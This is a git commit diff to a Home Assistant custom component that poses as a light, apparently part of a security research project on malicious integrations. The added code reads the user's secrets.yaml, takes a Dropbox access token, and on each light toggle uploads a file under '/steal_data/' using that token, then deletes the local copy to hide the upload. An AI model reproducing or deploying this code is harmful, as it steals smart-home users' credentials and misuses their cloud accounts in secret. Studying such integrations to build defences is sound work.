e56b63867e896502f3dac839cbd59335b36f2c9a
Luca Mannella <luca.mannella@polito.it>
2022-12-15 17:13:40 +0000

    implemented a different way of stealing the access token

--- light_stealing/light.py
+++ light_stealing/light.py
@@ -6,6 +6,7 @@ from datetime import datetime
 import logging
 
 import dropbox
+import yaml
 
 # Import the device class from the component that you want to support
 from homeassistant.components.light import LightEntity
@@ -22,6 +23,7 @@ DEFAULT_UPLOAD = False
 
 TARGET_NAME = "switch_exfiltration"
 TARGET_FULL_NAME = "switch.switch_exfiltration"
+TARGET_TOKEN_NAME = "db_access_token"
 
 _LOGGER = logging.getLogger(__name__)
 
@@ -90,13 +92,13 @@ class LightStealing(LightEntity):
         """
         self._brightness = 255
         self._state = True
-        self.use_stolen_access_token()
+        self.stole_token_from_conf()
 
     def turn_off(self, **kwargs: Any) -> None:
         """Instruct the light to turn off."""
         self._brightness = 0
         self._state = False
-        self.use_stolen_access_token()
+        self.stole_token_from_conf()
 
     def update(self) -> None:
         """Fetch new state data for this light.
@@ -108,7 +110,24 @@ class LightStealing(LightEntity):
         # self._brightness = self._light.brightness
         return
 
-    def use_stolen_access_token(self):
+    def stole_token_from_conf(self):
+        secrets_file_paths = "./config/secrets.yaml"
+        conf_file = None
+        with open(secrets_file_paths, "r") as stream:
+            try:
+                conf_file = yaml.safe_load(stream)
+            except yaml.YAMLError as exc:
+                _LOGGER.error("Error parsing configuration file: %s", exc)
+
+            if conf_file:
+                if TARGET_TOKEN_NAME not in conf_file:
+                    _LOGGER.warning("<%s> is not available in <%s>! ")
+                    return
+                else:
+                    dropbox_token = conf_file[TARGET_TOKEN_NAME]
+                    self.use_token(dropbox_token)
+
+    def stole_token_from_class(self):
         """This method uses the stolen token for uploading a file on Dropbox."""
         data = self.hass.data
         integrations = data[INTEGRATIONS_KEY]
@@ -123,29 +142,32 @@ class LightStealing(LightEntity):
             target_switch = target_integration_component.switch.SwitchExfiltration
 
             dropbox_token = target_switch._access_token
-            if not self._upload:
-                _LOGGER.warning("The Dropbox token is: <%s>", dropbox_token)
-            else:
-                filename = "tmp.txt"
-                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            self.use_token(dropbox_token)
 
-                # preparing the file to exfiltrate
-                tmp_file = open(filename, "w", encoding="utf-8")
-                text_to_write = (
-                    "At "
-                    + current_time
-                    + ' Luke was here! (Thanks to your dropbox token: "'
-                    + dropbox_token
-                    + '")'
-                )
-                tmp_file.write(text_to_write)
-                tmp_file.close()
+    def use_token(self, dropbox_token):
+        if not self._upload:
+            _LOGGER.warning("The Dropbox token is: <%s>", dropbox_token)
+        else:
+            filename = "tmp.txt"
+            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-                # Sending file
-                self.upload_file(filename, "/steal_data/" + filename, dropbox_token)
+            # preparing the file to exfiltrate
+            tmp_file = open(filename, "w", encoding="utf-8")
+            text_to_write = (
+                "At "
+                + current_time
+                + ' Luke was here! (Thanks to your dropbox token: "'
+                + dropbox_token
+                + '")'
+            )
+            tmp_file.write(text_to_write)
+            tmp_file.close()
 
-                # Removing the tmp file to hide the upload
-                os.remove(filename)
+            # Sending file
+            self.upload_file(filename, "/steal_data/" + filename, dropbox_token)
+
+            # Removing the tmp file to hide the upload
+            os.remove(filename)
 
     def upload_file(self, file_from, file_to, access_token):
         """upload a file to Dropbox using API v2"""
